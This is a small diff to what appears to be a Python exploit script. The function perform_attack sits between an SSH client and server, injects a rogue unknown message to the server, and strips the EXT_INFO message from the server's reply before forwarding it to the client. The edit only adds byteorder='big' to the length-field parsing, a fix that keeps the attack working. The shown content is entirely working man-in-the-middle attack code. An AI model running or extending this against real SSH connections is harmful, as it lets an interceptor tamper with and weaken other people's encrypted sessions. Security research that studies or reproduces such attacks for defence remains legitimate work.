@@ -64,9 +64,9 @@ def perform_attack(client_socket, server_socket):
     # Inject unknown message (will be answered with UNIMPLEMENTED by the server)
     server_socket.send(rogue_unknown_msg)
     # Strip EXT_INFO before forwarding server_response to client
-    server_kex_reply_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[:LENGTH_FIELD_LENGTH])
+    server_kex_reply_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[:LENGTH_FIELD_LENGTH], byteorder='big')
     server_newkeys_start = server_kex_reply_length
-    server_newkeys_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[server_newkeys_start:server_newkeys_start + LENGTH_FIELD_LENGTH])
+    server_newkeys_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[server_newkeys_start:server_newkeys_start + LENGTH_FIELD_LENGTH], byteorder='big')
     server_extinfo_start = server_newkeys_start + server_newkeys_length
     client_socket.send(server_response[:server_extinfo_start])
 
